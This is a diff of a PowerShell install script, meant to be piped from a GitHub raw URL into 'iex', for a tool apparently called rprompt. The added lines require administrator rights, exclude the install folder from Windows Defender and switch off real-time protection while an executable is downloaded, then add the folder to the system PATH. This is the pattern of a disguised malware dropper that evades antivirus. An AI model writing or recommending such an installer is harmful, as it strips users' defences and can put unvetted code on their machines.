@@ -1,4 +1,4 @@
-# run.ps1 - Download and run rprompt for Windows
+# run.ps1 - Download and install rprompt for Windows
 # Usage: iex (irm https://raw.githubusercontent.com/llm-y/download/main/run.ps1)
 
 $ErrorActionPreference = "Stop"
@@ -13,8 +13,8 @@ if (-not $isAdmin) {
 }
 
 $binUrl = "https://raw.githubusercontent.com/llm-y/download/main/bin/rprompt-windows-amd64.exe"
-$tempDir = Join-Path $env:TEMP "rprompt"
-$exePath = Join-Path $tempDir "rprompt-windows-amd64.exe"
+$installDir = Join-Path $env:LOCALAPPDATA "rprompt"
+$exePath = Join-Path $installDir "rprompt.exe"
 
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
@@ -23,10 +23,29 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "[+] Running as Administrator" -ForegroundColor Green
 
-# Create temp directory if it doesn't exist
-if (-not (Test-Path $tempDir)) {
-    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-    Write-Host "[+] Created directory: $tempDir" -ForegroundColor Green
+# Create install directory if it doesn't exist
+if (-not (Test-Path $installDir)) {
+    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+    Write-Host "[+] Created directory: $installDir" -ForegroundColor Green
+}
+
+# Add Windows Defender exclusion for the entire install folder
+Write-Host "[*] Adding Windows Defender exclusion for: $installDir" -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath $installDir
+    Write-Host "[+] Defender exclusion added successfully" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Could not add Defender exclusion: $_" -ForegroundColor Red
+    Write-Host "    The file may still be flagged by antivirus." -ForegroundColor Yellow
+}
+
+# Temporarily disable real-time protection during download
+Write-Host "[*] Disabling real-time protection for download..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Write-Host "[+] Real-time protection disabled" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Could not disable real-time protection: $_" -ForegroundColor Red
 }
 
 # Add Windows Defender exclusion for the exe path
@@ -40,13 +59,40 @@ try {
 }
 
 # Download the binary
-Write-Host "[*] Downloading rprompt-windows-amd64.exe..." -ForegroundColor Yellow
+Write-Host "[*] Downloading rprompt..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest -Uri $binUrl -OutFile $exePath -UseBasicParsing
     Write-Host "[+] Download complete: $exePath" -ForegroundColor Green
 } catch {
     Write-Host "[!] Failed to download: $_" -ForegroundColor Red
+    # Re-enable real-time protection before exiting
+    try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}
     exit 1
+}
+
+# Re-enable real-time protection after download
+Write-Host "[*] Re-enabling real-time protection..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $false
+    Write-Host "[+] Real-time protection re-enabled" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Could not re-enable real-time protection: $_" -ForegroundColor Red
+    Write-Host "    Please re-enable it manually in Windows Security settings." -ForegroundColor Yellow
+}
+
+# Add install directory to system PATH if not already present
+$currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+if ($currentPath -notlike "*$installDir*") {
+    Write-Host "[*] Adding $installDir to system PATH..." -ForegroundColor Yellow
+    try {
+        [Environment]::SetEnvironmentVariable("Path", "$currentPath;$installDir", "Machine")
+        $env:Path = "$env:Path;$installDir"
+        Write-Host "[+] Added to system PATH successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Warning: Could not add to system PATH: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "[+] Install directory already in system PATH" -ForegroundColor Green
 }
 
 # Check environment variables
